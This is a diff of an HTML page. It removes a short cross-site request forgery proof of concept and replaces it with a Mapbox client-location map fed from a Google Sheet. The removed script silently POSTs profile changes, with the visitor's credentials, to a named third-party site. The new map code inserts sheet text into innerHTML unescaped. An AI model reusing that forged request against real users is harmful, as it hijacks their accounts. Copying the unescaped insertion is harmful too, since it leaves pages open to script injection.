@@ -3,24 +3,136 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CSRF Attack</title>
+  <title>Optimized Map</title>
+  <!-- Mapbox CSS -->
+  <link href="https://api.mapbox.com/mapbox-gl-js/v3.7.0/mapbox-gl.css" rel="stylesheet">
+  <!-- Font Import -->
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;700&family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: 'DM Sans', sans-serif;
+    }
+    #map {
+      width: 100%;
+      height: 60vh;
+    }
+    .client-bar {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      padding: 20px;
+      overflow-y: auto;
+      max-height: 40vh;
+    }
+    .client-item {
+      padding: 15px;
+      border-radius: 10px;
+      background-color: #fbf6fe;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .client-item:hover {
+      background-color: #f2eaf7;
+    }
+    h5, p {
+      margin: 0;
+      font-family: 'Montserrat', sans-serif;
+      color: #410d5e;
+    }
+    .spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #9440c6;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
+  <!-- Loading Spinner -->
+  <div id="loading_background" style="position: absolute; width: 100%; height: 100%; background-color: rgba(174, 101, 218, 0.3); z-index: 99; display: flex; align-items: center; justify-content: center;">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Map Container -->
+  <div id="map"></div>
+
+  <!-- Client Info -->
+  <div class="client-bar" id="client-bar"></div>
+
+  <script src="https://api.mapbox.com/mapbox-gl-js/v3.7.0/mapbox-gl.js"></script>
   <script>
-    fetch("https://cors-anywhere.herokuapp.com/https://www.sarhne.com/ajax/user/user_info.html", {
-      headers: {
-        "accept": "*/*",
-        "accept-language": "ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6",
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "x-requested-with": "XMLHttpRequest"
-      },
-      referrer: "https://www.sarhne.com/setting.html?tab=profile&op=newActivity",
-      referrerPolicy: "strict-origin-when-cross-origin",
-      body: "name=omev&sex=0&bio=Llflmmmm",
-      method: "POST",
-      mode: "cors",
-      credentials: "include"
+    mapboxgl.accessToken = 'pk.eyJ1Ijoibm91ZmVsZ2hheWF0aTEiLCJhIjoiY20zb2wwdjJpMDRjOTJpc2Nic3ZsbG1lOCJ9.lyOTXJs_IKLh6hG0lUpHdw';
+
+    const map = new mapboxgl.Map({
+      container: 'map',
+      style: 'mapbox://styles/noufelghayati1/cm3ol8yzz008i01s7fqu88ae4',
+      center: [22.1392, 15.91],
+      zoom: 1.5,
+      projection: 'naturalEarth'
     });
+
+    const clientBar = document.getElementById('client-bar');
+    const bounds = new mapboxgl.LngLatBounds();
+    const locations_geojson = { type: "FeatureCollection", features: [] };
+
+    fetch('https://gsx2json.com/api?id=1E3Yn8gwdVKZEh7SQre1PadCcYwg52LRSi3E89xEQodY&sheet=Sheet1')
+      .then(response => response.json())
+      .then(data => {
+        const rows = data.rows.filter(row => row.Longitude && row.Latitude);
+
+        rows.forEach((row, index) => {
+          const coordinates = [parseFloat(row.Longitude), parseFloat(row.Latitude)];
+
+          // Add features to GeoJSON
+          locations_geojson.features.push({
+            type: "Feature",
+            geometry: { type: "Point", coordinates },
+            properties: { title: row['Company Name'], description: row['Case Study'] || '', id: index }
+          });
+
+          // Add client cards
+          const card = document.createElement('div');
+          card.className = 'client-item';
+          card.innerHTML = `
+            <h5>${row['Company Name']}</h5>
+            <p>${row['Address (City)'] || ''}</p>
+            <p style="margin-top: 10px;">${row['Case Study'] || ''}</p>
+          `;
+          card.onclick = () => {
+            map.flyTo({ center: coordinates, zoom: 5 });
+          };
+          clientBar.appendChild(card);
+
+          bounds.extend(coordinates);
+        });
+
+        // Add points to the map
+        map.on('load', () => {
+          map.addSource('points', { type: 'geojson', data: locations_geojson });
+          map.addLayer({
+            id: 'points',
+            type: 'circle',
+            source: 'points',
+            paint: {
+              'circle-radius': 6,
+              'circle-color': '#9440c6',
+              'circle-stroke-width': 1,
+              'circle-stroke-color': '#fff'
+            }
+          });
+
+          map.fitBounds(bounds, { padding: 50 });
+          document.getElementById('loading_background').style.display = 'none';
+        });
+      });
   </script>
 </body>
 </html>
